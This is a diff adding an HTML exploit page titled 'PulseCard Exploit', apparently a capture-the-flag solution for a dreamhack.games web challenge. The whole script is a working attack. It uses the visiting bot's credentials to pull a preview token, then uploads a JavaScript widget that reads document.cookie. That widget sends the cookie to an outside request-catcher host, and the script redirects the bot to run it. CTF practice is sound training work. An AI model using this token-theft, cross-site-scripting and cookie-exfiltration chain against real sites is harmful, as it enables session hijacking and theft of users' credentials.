@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><title>PulseCard Exploit</title></head>
+<body>
+<script>
+const BASE = "http://host3.dreamhack.games:12869";
+const EXFIL = "https://rimeefs.request.dreamhack.games/flag";
+
+(async () => {
+  // 1. 봇의 SID로 preview token 획득
+  const previewResp = await fetch(`${BASE}/preview`, { credentials: "include" });
+  const previewHtml = await previewResp.text();
+  const tokenMatch = previewHtml.match(/window\.CARD_TOKEN = "([^"]+)"/);
+  if (!tokenMatch) throw new Error("token not found");
+  const token = tokenMatch[1];
+
+  // 2. 플래그 탈취 페이로드
+  const payload = `
+    (function() {
+      const flag = document.cookie;
+      fetch("${EXFIL}?c=" + encodeURIComponent(flag), { mode: "no-cors" });
+    })();
+  `;
+
+  // 3. 봇 소유의 위젯 업로드
+  const exportResp = await fetch(`${BASE}/export`, {
+    method: "POST",
+    credentials: "include",
+    headers: { "Content-Type": "application/javascript", "X-Card-Token": token },
+    body: payload
+  });
+  const widgetName = await exportResp.text();
+
+  // 4. 위젯 실행 페이지로 이동
+  location.href = `${BASE}/review?widget=${widgetName}`;
+})();
+</script>
+</body>
+</html>
